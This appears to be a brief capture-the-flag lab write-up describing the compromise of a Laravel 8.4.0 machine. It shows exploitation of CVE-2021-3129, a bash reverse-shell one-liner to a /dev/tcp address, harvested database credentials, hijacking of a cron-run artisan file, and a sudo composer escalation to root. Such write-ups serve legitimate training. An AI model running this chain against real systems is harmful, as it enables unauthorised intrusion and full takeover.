nmap shows ports 22, 80
port 80 dint give out any CMS or versions, just some user names

so we register, and see we can upload some file
So we try to upload php rev shell, and it gets us nowhere
After Struggling for a while,
HINT TAKEN : when we try to visit a random page, like IP/nono
it shows "404 | laravel 8.4.0"
searchsploit laravel 8.4 shows a debug mode code execution vulnerability
php/webapps/49424.py
But this doesnt really work

we find it is CVE-2021-3129
and an exploit at https://github.com/crypt0lith/laravel-rce/
`python cve-2021-3129.py --phpggc ../phpggc http://192.168.132.38 id` gives us the id

`python cve-2021-3129.py --phpggc ../phpggc http://192.168.132.38 "bash -c 'bash -i >& /dev/tcp/192.168.45.160/22 0>&1'"` gives us reverse shell on port 22
www-data!

---
we find some config files in  /var/www/html/lavita/config
```
echo $DB_PASSWORD
sdfquelw0kly9jgbx92

echo $DB_USERNAME
lavita

databse db name lavita
```

a few configs for different ports, 3306, 6379, 1433, 5432
`ss -tulpn | grep -E '(127.0.0.1:|::1:)'` confirms only 3306 is listening

`mysql -h 127.0.0.1 -u lavita -D lavita -p`
`select * from users;`
`burt |  $2y$10$pOJQC9SYi3cC8QnviiJiDegfeyv.4Ap1Np0Jdi6G0gW3BYRj801by`
But it is a yescrypt, I highli doubt it is crackable
Was my own password from when I registered, great

running pspy, we find a line, being run by udi 1001, which is skunk
`/usr/bin/php /var/www/html/lavita/artisan clear:pictures`
The file artisan, I have full permissions over
So, lets get dat rev shell!
replace artisan with php-reverse-shell.php and start listening
get dat shell
skunk!

---
we see we are a member of sudo grou(?)
sudo -l shows we can run
`/usr/bin/composer --working-dir\=/var/www/html/lavita *`
gtfo bins shows how we can exploit this to get root
```
echo '{"scripts":{"x":"/bin/sh"}}' > /var/www/html/lavita/composer.json
#composer run-script x
```
cant write into lavita as skunk, but can do as www-data
`sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x`
gave us root!